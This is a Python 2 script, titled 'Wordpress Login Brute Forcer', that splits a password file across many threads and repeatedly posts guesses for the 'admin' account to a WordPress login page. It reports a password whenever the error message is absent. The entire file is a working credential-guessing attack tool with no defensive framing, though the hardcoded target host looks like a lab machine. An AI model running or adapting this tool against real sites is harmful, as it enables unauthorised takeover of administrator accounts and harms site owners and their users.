#!/usr/bin/env python

import time
from threading import Thread
import requests
import itertools
import re
import sys
import argparse


def check_pass(passwords, threadNum, timing):
	user = "admin"
	regex = ur"<strong>ERROR</strong>"
	url="http://doom:8000/wp-login.php"
	global MATCH

	MATCH = False
	for i in range(len(passwords)):
		payload = {'log':user, 'pwd':passwords[i],'wp-submit':'Log In'}
		#print "%d Trying: admin/%s" % (threadNum,passwords[i])
		r = requests.post(url,data=payload)
		match = re.search(regex,r.text)
		if match:
			#print "NO MATCH"
			pass
		else:
			print "Worker %d found a password: %s" % (threadNum, passwords[i])
			MATCH=True
			return

		if (MATCH == True):
			return

		time.sleep(timing)
	print "Worker #%d finished." % (threadNum)


def main(argv):
	THREADS = 20
	PASSWORDS = ""
	TIMING = 0

	# command line arguments
	parser = argparse.ArgumentParser(description="Wordpress Login Brute Forcer")
	parser.add_argument('-t', action="store", dest="threads", nargs=1, type=int, help="How many threads to spawn.")
	parser.add_argument('-f', action="store", dest="password_file", nargs=1, help="Provided password file.")
	parser.add_argument('-n', action="store", dest="seconds", nargs=1, type=int, help="Thread timing value.")

	results = parser.parse_args()
	if (results.password_file):
		print "Using password file %s" % (results.password_file[0])
		PASSWORDS = results.password_file[0]
	else:
		print "No password file.."
		sys.exit(-1)

	if (results.threads):
		print "Setting up %d workers" % (results.threads[0])
		THREADS = results.threads[0]
	else:
		print "Using default 20 workers.."

	if (results.seconds):
		print "Pausing %d seconds between each login attempt." % (results.seconds[0])
		TIMING = results.seconds[0]

	# how many lines are we dealing with?
	num_lines = sum(1 for line in open(PASSWORDS))
	# double open? FIXME
	text_file = open(PASSWORDS,'r')
	# sane array
	lines = []

	# read in each line, strip new line, append to array.
	for index,text in enumerate(text_file):
		if 0 <= index <= num_lines:
			lines.append(text.strip("\n"))

	# some lambda magic that splits array into chunks
	chunks = lambda l, n: [l[x: x+n] for x in xrange(0,len(l), n)]
	# chunky!
	password_lines = chunks(lines, len(lines)/THREADS)
	print "Using average size of %d passwords/worker" % (len(password_lines[0]))

	# Fire off worker threads with each chunk.
	print "Starting Workers..."
	for worker_number in range(len(password_lines)):
		# send to thread
		t = Thread(target=check_pass, args=(password_lines[worker_number],worker_number,TIMING,))
		t.start()

if __name__ == "__main__":
	main(sys.argv)
